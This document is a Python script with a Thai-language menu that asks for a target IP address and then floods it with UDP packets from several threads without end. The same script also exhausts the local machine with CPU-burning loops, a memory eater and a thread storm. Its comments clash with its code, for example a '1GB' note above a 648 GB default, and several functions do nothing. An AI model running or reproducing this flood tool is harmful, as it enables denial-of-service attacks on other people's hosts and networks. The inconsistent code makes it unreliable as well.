import socket
import threading
import os
import time
import asyncio
from multiprocessing import cpu_count

RED = "\033[91m"
GREEN = "\033[92m"
CYAN = "\033[96m"
RESET = "\033[0m"

PORT = 9999

# =================== FUNCTIONS ===================

# CPU HELL 200x
def cpu_hell():
    while True:
        x = 1
        for _ in range(200):
            x *= 99999999

# RAM eater 648GB
def ram_eater_gb(gb=648):
    buf = []
    for _ in range(gb * 1024):
        buf.append("X" * 1_000_000)
    while True:
        time.sleep(1)

# UDP flood
def udp_flood(ip, packets=200_000):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    payload = os.urandom(1024)
    while True:
        for _ in range(packets):
            s.sendto(payload, (ip, PORT))

# Thread storm
def thread_storm(count=5000):
    for _ in range(count):
        threading.Thread(target=lambda: None, daemon=True).start()

# Flood
def flood(count):
    for _ in range(count):
        time.sleep(0.001)

# Rate Control
def rate_control(count, rate):
    for _ in range(count):
        time.sleep(1/rate)

# Random Payload
def random_payload(length=32):
    payload = ''.join([chr(i % 126) for i in range(length)])
    print(GREEN + f"[RandomPayload] {payload}" + RESET)

async def async_packet(i):
    print(f"[Async] packet {i}")
    await asyncio.sleep(0.01)

# =================== SEND ALL ===================
def send_all(ip, count_packet, thread_count):
    try:
        # Flood
        threading.Thread(target=flood, args=(count_packet,), daemon=True).start()

        # Rate control
        threading.Thread(target=rate_control, args=(count_packet, 100), daemon=True).start()

        # CPU hell
        for _ in range(cpu_count()):
            threading.Thread(target=cpu_hell, daemon=True).start()

        # RAM eater 1GB
        threading.Thread(target=ram_eater_gb, daemon=True).start()

        # UDP flood (ส่ง IP เข้าไปด้วย)
        for _ in range(5):
            threading.Thread(target=udp_flood, args=(ip,), daemon=True).start()

        # Thread storm
        thread_storm(thread_count)

        # Random payload
        for _ in range(5):
            random_payload()

        # Loop to keep running until Ctrl+C
        while True:
            time.sleep(1)

    except KeyboardInterrupt:
        print(RED + "\nหยุดแล้ว" + RESET)

# =================== MENU ===================
def main():
    while True:
        os.system("clear")
        print(CYAN + "1) ยิงเน็ตเครื่องอื่น" + RESET)
        print(CYAN + "2) ออก\n" + RESET)

        choice = input("เลือกเมนู: ")

        if choice == "1":
            input_ip = input("ใส่ IP ที่จะยิง: ")
            count_packet = int(input("จำนวนที่จะยิง: "))
            thread_count = int(input("จำนวนเธรด: "))
            input("กด Enter เพื่อเริ่ม…")
            send_all(input_ip, count_packet, thread_count)
            input("\nกด Enter เพื่อกลับเมนู…")

        elif choice == "2":
            print("ปิดโปรแกรม…")
            break

        else:
            print(RED + "เลือกผิด!" + RESET)
            time.sleep(1)

if __name__ == "__main__":
    main()
